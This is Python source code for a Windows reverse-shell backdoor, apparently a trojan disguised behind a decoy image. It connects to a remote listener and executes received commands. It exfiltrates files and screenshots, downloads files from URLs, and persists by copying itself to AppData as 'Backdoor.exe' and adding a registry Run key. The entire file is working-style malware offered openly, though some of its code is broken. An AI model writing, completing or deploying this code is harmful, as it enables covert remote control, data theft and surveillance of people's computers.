#!/usr/bin/python
import time
import socket
import ctypes
from mss import mss
import subprocess
import json
import os
import shutil
import sys
import requests
 
def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)
 
def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue
 
def screenshot():
        with mss as screenshot:
                screenshot.shot()
#def screenshot is a non-returning function 
def download(url):
        get_response = requests.get(url)
        file_name    = url.split("/")[-1]
        with open (file_name, "wb") as out_file:
                out_file.write(get_response.content)
 
 
def is_admin():
        global admin
        try:
                temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\Windows'),'temp']))
        except:
                print "Administrator priviledges"
        else:
                print "User Priviledges"
 
def shell():
        while True:
                command = reliable_recv()
                if command == "q":
                        break
                elif command[:2]=="cd" and len(command) >1:
                        try:
                                os.chdir(command[3:])
                        except:
                                continue
                elif command[:8]=="download":
                        with open(command[9:],"rb") as file:
                                reliable_send(base64.b64encode(file.read()))
                elif command[:6]=="upload":
                        with open(command[7:],"wb") as fin:
                                result = reliable_recv()
                                fin.write(base64.b64decode(result))
                elif command[:5]=="start":
                        try:
                                subprocess.Popen(command[6:],shell=True)
                                reliable_send("[+] Application Started")
                        except:
                                reliable_send("[!!] Failed to start Application")
                elif command[:4]=="help":
                        try:
 
                                help_doc= '''*************** Help Menu*************** 
                                                download <path> ----> download a file from the given path
                                                upload   <path> ----> uplaod a file to the given path
                                                get     <url>  ----> get a file off the Internet from the given url
                                                start    <path> ----> start a program on the target pc
                                                screeshot       ----> take a screenshot of the target PC
                                                check           ----> check whether the user runs with administrator priviledges or not
                                                help            ----> print out the help menu
                                                q               ----> exit the reverse shell
                                           ****************************************** '''
                                reliable_send(help_doc)
                        except :
                                print "The Menu could not be displayed." 
 
                elif command[:5] =="check":
                        try:
                                is_admin()
                                reliable_send(admin)
                        except:
                                print("cannot perform the check operation")
 
                elif command[:10] == "screenshot":
                        try : 
                                screenshot()
                                with open("monitor-1.png","rb") as sc:
                                        reliable_send(base64.b64encode(sc.read()))
                                        os.remove("monitor-1.png")
 
                        except:
                                reliable_send("[!!] Failed to Take screenshot")
 
                elif command[:3]=="get":
                        try:
                                download(command[4:])
                                reliable_send("[+]Downloaded file from Special URLS")
                        except:
                                reliable_send("[!!] Failed to Download File ")
                else:
                        try:
                                proc = subprocess.Popen( command , shell=True , stdout=subprocess.PIPE , stderr=subprocess.PIPE , stdin=subprocess.PIPE )
                                result = proc.stdout.read()+proc.stderr.read()
                                reliable_send(result)
                        except:
                                reliable.send("[!!]Cant Execute this Command")
 
location = os.environ["appdata"]+"\\Backdoor.exe"
if not os.path.exists(location):
        shutil.copyfile(sys.executable , location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\Current\Version\Run /v Backdoor /t REG_SZ /d "'+location+ '"', shell=True)
        name = sys._MEIPASS +"/name_of_image.jpg"
        try:
                subprocess.Popen( name , shell = True)
        except:
                #you can type any code here.It should be useless and not affect any class member.
 
def connection():
        time.sleep(20)
        try:
        
                sock.connect(("127.0.0.1",3000))
                shell()
        except:
                connection()            
 
 
sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
 
connection()
sock.close()
 
